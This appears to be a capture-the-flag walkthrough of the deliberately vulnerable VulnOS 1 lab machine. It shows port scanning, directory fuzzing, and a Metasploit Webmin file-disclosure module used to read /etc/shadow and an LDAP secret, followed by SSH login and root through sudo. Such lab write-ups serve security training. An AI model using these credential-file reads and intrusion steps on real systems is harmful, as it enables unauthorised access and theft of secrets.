# VulnOS: 1

## 1.Get VM IP

```text
root@kali: arp-scan -I eth0 -l

Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:0f       (Unknown: locally administered)
192.168.56.100  08:00:27:30:b6:29       PCS Systemtechnik GmbH
192.168.56.105  08:00:27:43:06:19       PCS Systemtechnik GmbH
```

The IP address is `192.168.56.105`, let's enumerate it.

## 2.Enumeration

```text
root@kali: nmap -sV -sC -p- -v -oN fullscan 192.168.56.105

Nmap scan report for 192.168.56.105
Host is up (0.00012s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 43:a6:84:8d:be:1a:ee:fb:ed:c3:23:53:14:14:8f:50 (DSA)
|_  2048 30:1d:2d:c4:9e:66:d8:bd:70:7c:48:84:fb:b9:7b:09 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_ssl-date: 2023-09-26T11:29:23+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=VulnOS.home
| Issuer: commonName=VulnOS.home
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2014-03-09T14:00:56
| Not valid after:  2024-03-06T14:00:56
| MD5:   fab2:dc38:f81d:7da1:474f:7327:417b:60ed
|_SHA-1: c182:f6e0:08cd:690a:ad74:42c2:efaf:ed7d:78c8:2b92
|_smtp-commands: VulnOS.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
53/tcp    open  domain      ISC BIND 9.7.0-P1
| dns-nsid:
|_  bind.version: 9.7.0-P1
80/tcp    open  http        Apache httpd 2.2.14 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: index
|_http-server-header: Apache/2.2.14 (Ubuntu)
110/tcp   open  pop3        Dovecot pop3d
|_ssl-date: 2023-09-26T11:29:23+00:00; -1s from scanner time.
|_pop3-capabilities: TOP STLS CAPA UIDL PIPELINING RESP-CODES SASL
| sslv2:
|   SSLv2 supported
|_  ciphers: none
| ssl-cert: Subject: commonName=VulnOS.home
| Issuer: commonName=VulnOS.home
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2014-03-09T14:00:56
| Not valid after:  2024-03-06T14:00:56
| MD5:   fab2:dc38:f81d:7da1:474f:7327:417b:60ed
|_SHA-1: c182:f6e0:08cd:690a:ad74:42c2:efaf:ed7d:78c8:2b92
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      40186/udp   mountd
|   100005  1,2,3      50915/tcp   mountd
|   100021  1,3,4      34164/tcp   nlockmgr
|   100021  1,3,4      60521/udp   nlockmgr
|   100024  1          35181/udp   status
|_  100024  1          48407/tcp   status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap        Dovecot imapd
| sslv2:
|   SSLv2 supported
|_  ciphers: none
|_imap-capabilities: UIDPLUS THREAD=REFERENCES LITERAL+ CHILDREN IDLE UNSELECT SASL-IR completed Capability SORT LOGINDISABLEDA0001 STARTTLS CONDSTORE CONTEXT=SEARCH IMAP4rev1 ENABLE THREAD=REFS LIST-EXTENDED SEARCHRES QRESYNC ESEARCH NAMESPACE ESORT WITHIN I18NLEVEL=1 ID OK LOGIN-REFERRALS MULTIAPPEND SORT=DISPLAY
|_ssl-date: 2023-09-26T11:29:23+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=VulnOS.home
| Issuer: commonName=VulnOS.home
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2014-03-09T14:00:56
| Not valid after:  2024-03-06T14:00:56
| MD5:   fab2:dc38:f81d:7da1:474f:7327:417b:60ed
|_SHA-1: c182:f6e0:08cd:690a:ad74:42c2:efaf:ed7d:78c8:2b92
389/tcp   open  ldap        OpenLDAP 2.2.X - 2.3.X
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  shell       Netkit rshd
901/tcp   open  http        Samba SWAT administration server
| http-methods:
|_  Supported Methods: GET POST
| http-auth:
| HTTP/1.0 401 Authorization Required\x0D
|_  Basic realm=SWAT
|_http-title: 401 Authorization Required
993/tcp   open  ssl/imap    Dovecot imapd
| ssl-cert: Subject: commonName=VulnOS.home
| Issuer: commonName=VulnOS.home
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2014-03-09T14:00:56
| Not valid after:  2024-03-06T14:00:56
| MD5:   fab2:dc38:f81d:7da1:474f:7327:417b:60ed
|_SHA-1: c182:f6e0:08cd:690a:ad74:42c2:efaf:ed7d:78c8:2b92
|_ssl-date: 2023-09-26T11:29:23+00:00; -1s from scanner time.
| sslv2:
|   SSLv2 supported
|_  ciphers: none
|_imap-capabilities: UIDPLUS THREAD=REFERENCES LITERAL+ CHILDREN IDLE UNSELECT SASL-IR completed Capability OK SORT SEARCHRES CONDSTORE CONTEXT=SEARCH IMAP4rev1 ENABLE THREAD=REFS LIST-EXTENDED AUTH=PLAIN QRESYNC ESEARCH NAMESPACE ESORT WITHIN I18NLEVEL=1 ID AUTH=LOGINA0001 LOGIN-REFERRALS MULTIAPPEND SORT=DISPLAY
995/tcp   open  ssl/pop3    Dovecot pop3d
| ssl-cert: Subject: commonName=VulnOS.home
| Issuer: commonName=VulnOS.home
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2014-03-09T14:00:56
| Not valid after:  2024-03-06T14:00:56
| MD5:   fab2:dc38:f81d:7da1:474f:7327:417b:60ed
|_SHA-1: c182:f6e0:08cd:690a:ad74:42c2:efaf:ed7d:78c8:2b92
|_pop3-capabilities: TOP PIPELINING CAPA UIDL USER RESP-CODES SASL(PLAIN LOGIN)
| sslv2:
|   SSLv2 supported
|_  ciphers: none
|_ssl-date: 2023-09-26T11:29:23+00:00; -1s from scanner time.
2000/tcp  open  sieve       Dovecot timsieved
2049/tcp  open  nfs         2-4 (RPC #100003)
3306/tcp  open  mysql       MySQL 5.1.73-0ubuntu0.10.04.1
| mysql-info:
|   Protocol: 10
|   Version: 5.1.73-0ubuntu0.10.04.1
|   Thread ID: 311
|   Capabilities flags: 63487
|   Some Capabilities: SupportsLoadDataLocal, ODBCClient, Support41Auth, DontAllowDatabaseTableColumn, InteractiveClient, SupportsTransactions, IgnoreSigpipes, FoundRows, Speaks41ProtocolOld, SupportsCompression, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, LongColumnFlag, LongPassword
|   Status: Autocommit
|_  Salt: S^[2#Xs[LIjZelnf2f-I
3632/tcp  open  tcpwrapped
6667/tcp  open  irc         IRCnet ircd
8070/tcp  open  ucs-isc?
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
| http-methods:
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 1F4BAEFFD3C738F5BEDC24B7B6B43285
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/0.01
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
34164/tcp open  nlockmgr    1-4 (RPC #100021)
48407/tcp open  status      1 (RPC #100024)
50915/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  VulnOS.home, irc.localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```

There are many ports open on this box, so we need a lot of enumerations.

we first go with web enumeration, the first page is shown below :

![mainPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/5eb10cb1-423f-4cb0-a77f-402a943781a5)

we start by fuzzing for new directories with ffuf :

```text
root@kali: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   -u http://192.168.56.105/FUZZ/ -fc 403

[Status: 200, Size: 72044, Words: 5070, Lines: 1003, Duration: 159ms]
    * FUZZ: icons

[Status: 200, Size: 898, Words: 49, Lines: 15, Duration: 7ms]
    * FUZZ: imgs

[Status: 200, Size: 154700, Words: 8980, Lines: 759, Duration: 4247ms]
    * FUZZ: doc

[Status: 200, Size: 1529, Words: 83, Lines: 18, Duration: 7ms]
    * FUZZ: insecure

[Status: 200, Size: 8625, Words: 1105, Lines: 139, Duration: 2131ms]
    * FUZZ: phpmyadmin

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 6521ms]
    * FUZZ: mediawiki

[Status: 200, Size: 745, Words: 39, Lines: 15, Duration: 10ms]
    * FUZZ:

[Status: 200, Size: 1640, Words: 247, Lines: 40, Duration: 140ms]
    * FUZZ: phpsysinfo

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 96ms]
    * FUZZ: phpgroupware

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4657ms]
    * FUZZ: egroupware

[Status: 200, Size: 1012, Words: 63, Lines: 27, Duration: 1346ms]
    * FUZZ: phppgadmin
```

i found afew directories and we need to check them all, after searching and gaining an understanding on various services running

on this machine, i tried several brute force attacks against login pages but did not succeed :(

i decided to go for another port enumeration that i knew might have vulnerabilities, port `10000` which for webmin

i used metasploit `auxiliary(admin/webmin/file_disclosure)` to see the `/etc/passwd` file :

```text
msf6 auxiliary(admin/webmin/file_disclosure) > set rhosts 192.168.56.105
rhosts => 192.168.56.105
msf6 auxiliary(admin/webmin/file_disclosure) > run
[*] Running module against 192.168.56.105

[*] Attempting to retrieve /etc/passwd...
[*] The server returned: 200 Document follows
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
landscape:x:102:108::/var/lib/landscape:/bin/false
vulnosadmin:x:1000:1000:vulnosadmin,,,:/home/vulnosadmin:/bin/bash
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
webmin:x:1002:1002::/home/webmin:/bin/sh
hackme:x:1003:1003::/home/hackme:/bin/sh
sa:x:1004:1004::/home/sa:/bin/sh
stupiduser:x:1005:1005::/home/stupiduser:/bin/sh
messagebus:x:103:112::/var/run/dbus:/bin/false
distccd:x:104:65534::/:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
openldap:x:106:113:OpenLDAP Server Account,,,:/nonexistent:/bin/false
ftp:x:1006:1006::/home/ftp:/bin/sh
mysql:x:107:115:MySQL Server,,,:/var/lib/mysql:/bin/false
telnetd:x:108:116::/nonexistent:/bin/false
bind:x:109:117::/var/cache/bind:/bin/false
postgres:x:110:118:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
postfix:x:111:119::/var/spool/postfix:/bin/false
dovecot:x:112:121:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
tomcat6:x:113:122::/usr/share/tomcat6:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:123::/var/lib/snmp:/bin/false
nagios:x:116:124::/var/lib/nagios:/bin/false
openerp:x:117:125:Open ERP server,,,:/home/openerp:/bin/false
[*] Auxiliary module execution completed
```

and of course see the `/etc/shadow` file :

```text
msf6 auxiliary(admin/webmin/file_disclosure) > set rpath /etc/shadow
rpath => /etc/shadow
msf6 auxiliary(admin/webmin/file_disclosure) > run
[*] Running module against 192.168.56.105

[*] Attempting to retrieve /etc/shadow...
[*] The server returned: 200 Document follows
root:*:16137:0:99999:7:::
daemon:*:16137:0:99999:7:::
bin:*:16137:0:99999:7:::
sys:*:16137:0:99999:7:::
sync:*:16137:0:99999:7:::
games:*:16137:0:99999:7:::
man:*:16137:0:99999:7:::
lp:*:16137:0:99999:7:::
mail:*:16137:0:99999:7:::
news:*:16137:0:99999:7:::
uucp:*:16137:0:99999:7:::
proxy:*:16137:0:99999:7:::
www-data:*:16137:0:99999:7:::
backup:*:16137:0:99999:7:::
list:*:16137:0:99999:7:::
irc:*:16137:0:99999:7:::
gnats:*:16137:0:99999:7:::
nobody:*:16137:0:99999:7:::
libuuid:!:16137:0:99999:7:::
syslog:*:16137:0:99999:7:::
landscape:*:16137:0:99999:7:::
vulnosadmin:$6$SLXu95CH$pVAdp447R4MEFKtHrWcDV7WIBuiP2Yp0NJTVPyg37K9U11SFuLena8p.xbnSVJFAeg1WO28ljNAPrlXaghLmo/:16137:0:99999:7:::
sysadmin:admin:16137:0:99999:7:::
webmin:webmin:16137:0:99999:7:::
hackme:hackme:16137:0:99999:7:::
sa:password1:16137:0:99999:7:::
stupiduser:stupiduser:16137:0:99999:7:::
messagebus:*:16137:0:99999:7:::
distccd:*:16137:0:99999:7:::
sshd:*:16138:0:99999:7:::
openldap:!:16138:0:99999:7:::
ftp:!:16138:0:99999:7:::
mysql:!:16138:0:99999:7:::
telnetd:*:16138:0:99999:7:::
bind:*:16138:0:99999:7:::
postgres:*:16138:0:99999:7:::
postfix:*:16138:0:99999:7:::
dovecot:*:16138:0:99999:7:::
tomcat6:*:16138:0:99999:7:::
statd:*:16138:0:99999:7:::
snmp:*:16138:0:99999:7:::
nagios:!:16140:0:99999:7:::
openerp:*:16140:0:99999:7:::
[*] Auxiliary module execution completed
```

as it shows here, the user `vulnosadmin` has a password hash here.

i tried to crack the hash with john and rockyou.txt but did not succeed.

at least we have something to work with.

i tried enumerating other ports and services but none of the gave something interesting except port `389`

which is for `ldap`, after alittle reserach on ldap for unix machines i came accross a file which drew my attention

and that was the usage of the file `/etc/ldap.secret` which is a shared secret or password used for secure communication between

LDAP clients and the LDAP server. This shared secret is used for authentication and encryption purposes.

since our victim is running LDAP, i tried to grab this file with webmin vulnerability :

```text
msf6 auxiliary(admin/webmin/file_disclosure) > set rpath /etc/ldap.secret
rpath => /etc/ldap.secret
msf6 auxiliary(admin/webmin/file_disclosure) > run
[*] Running module against 192.168.56.105

[*] Attempting to retrieve /etc/ldap.secret...
[*] The server returned: 200 Document follows
canuhackme
[*] Auxiliary module execution completed
```

## 3.Gaining Shell

Yes, this file exists and has a string in it, i though that maybe this string is the password for the user vulnosadmin

so i tried to SSH to maching using `vulnosadmin:canuhackme` :

```text
ssh vulnosadmin@192.168.56.105
vulnosadmin@192.168.56.105's password:
Linux VulnOS 2.6.32-57-generic-pae #119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686 GNU/Linux
Ubuntu 10.04.4 LTS

Welcome to Ubuntu!
 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Sep 27 09:21:09 CEST 2023

  System load:  0.07               Processes:           147
  Usage of /:   17.4% of 23.06GB   Users logged in:     0
  Memory usage: 40%                IP address for eth0: 192.168.56.105
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

New release 'precise' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Mar 19 17:31:44 2014 from 192.168.1.3
vulnosadmin@VulnOS:~$ id
uid=1000(vulnosadmin) gid=1000(vulnosadmin) groepen=4(adm),20(dialout),24(cdrom),46(plugdev),109(lpadmin),110(sambashare),111(admin),1000(vulnosadmin)
```

wow, we got the shell here.

## 4.Privilege Escalation

Just check for sudo permissions on the box for user vulnosadmin:

```text
vulnosadmin@VulnOS:~$ sudo -l
[sudo] password for vulnosadmin:
Matching Defaults entries for vulnosadmin on this host:
    env_reset

User vulnosadmin may run the following commands on this host:
    (ALL) ALL
```

wow we can run every command here :

```text
vulnosadmin@VulnOS:~$ sudo bash

root@VulnOS:~# id
uid=0(root) gid=0(root) groepen=0(root)

root@VulnOS:~# cd /root
root@VulnOS:/root# ls
hello.txt

root@VulnOS:/root# cat hello.txt
Hello,

So you got root... You still need to find the rest of the vulnerabilities inside the OS !

TRY HARDER !!!!!!!
root@VulnOS:/root#
```

This is how we can get root on this machine, but there are still other ways to do this :)









